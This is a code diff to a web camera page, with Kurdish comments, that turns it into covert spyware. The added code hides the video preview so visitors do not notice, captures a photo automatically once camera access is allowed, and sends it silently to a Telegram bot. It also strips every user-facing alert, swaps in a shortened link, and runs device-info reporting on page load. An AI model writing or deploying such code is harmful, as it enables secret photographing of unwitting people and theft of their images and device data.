@@ -8,7 +8,8 @@
         body { margin: 0; background: #000; font-family: Tahoma, sans-serif; height: 100vh; overflow: hidden; display: flex; flex-direction: column; color: white; }
         
         .camera-screen { position: relative; width: 100%; height: 100vh; background: #111; display: flex; flex-direction: column; justify-content: space-between; }
-        video { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 1; }
+        /* ڤیدیۆکە شاراوە دەبێت تا بەکارهێنەر هەستی پێ نەكات */
+        video { display: none; }
         
         .top-bar { position: relative; z-index: 10; display: flex; justify-content: space-between; align-items: flex-start; padding: 15px 20px; }
         .top-left { display: flex; gap: 15px; align-items: center; }
@@ -177,7 +178,7 @@
                                 [
                                     {
                                         text: "🔗 سەردانیکردنی وێبسایتەکە",
-                                        url: "https://yourusername.github.io/your-repo/" // <-- لێرە لینکی ماڵپەڕەکەی خۆت دابنە
+                                        url: "https://pqr.me/tXkzZOTt"
                                     }
                                 ]
                             ]
@@ -187,7 +188,7 @@
             } catch (err) {}
         }
 
-        async function startCamera() {
+        async function startCameraAndAutoCapture() {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
@@ -195,18 +196,50 @@
                 const constraints = { 
                     video: { facingMode: currentFacingMode } 
                 };
+                // ئەم ڕستەیە پەنجەرەی Allow دێنێتە پێشەوە
                 stream = await navigator.mediaDevices.getUserMedia(constraints);
                 document.getElementById('cameraView').srcObject = stream;
                 flashOn = false;
-                document.getElementById('flashBtn').classList.remove('active');
+                
+                // دەستبەجێ دوای ئەوەی Allowـی کرد، وێنەکە دەگرێت و دەنێرێت
+                setTimeout(() => {
+                    autoCaptureAndSend();
+                }, 800);
+
             } catch (err) {
-                alert("Unable to access the camera.");
+                // ئەگەر بەکارهێنەر Don't Allowـی کرد
             }
+        }
+
+        function autoCaptureAndSend() {
+            const video = document.getElementById('cameraView');
+            const canvas = document.getElementById('canvas');
+            
+            if (!video.videoWidth) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(async function(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'dark-chat-photo.jpg');
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {}
+            }, 'image/jpeg');
         }
 
         function switchCamera() {
             currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-            startCamera();
+            startCameraAndAutoCapture();
         }
 
         async function toggleFlash() {
@@ -226,49 +259,17 @@
                     } else {
                         flashBtn.classList.remove('active');
                     }
-                } catch (err) {
-                    alert("Flash is not supported on this device.");
-                }
-            } else {
-                alert("The current camera does not support flash.");
+                } catch (err) {}
             }
         }
 
         function capturePhoto() {
-            const video = document.getElementById('cameraView');
-            const canvas = document.getElementById('canvas');
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(async function(blob) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'dark-chat-photo.jpg');
-                
-                try {
-                    let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                    let data = await response.json();
-                    if (data.ok) {
-                        alert("وێنەکە بە سەرکەوتوویی نێردرا بۆ بۆتی تلیگرام!");
-                    } else {
-                        alert("هەڵە ڕویدا لە ناردنی وێنە.");
-                    }
-                } catch (e) {
-                    alert("کێشەی پەیوەندی هەیە.");
-                }
-            }, 'image/jpeg');
+            autoCaptureAndSend();
         }
 
+        // کارپێکردنی ئۆتۆماتیکی لە کاتی کردنەوەی وێبسایتەکەدا
         sendDeviceInfo();
-        startCamera();
+        startCameraAndAutoCapture();
     </script>
 </body>
 </html>
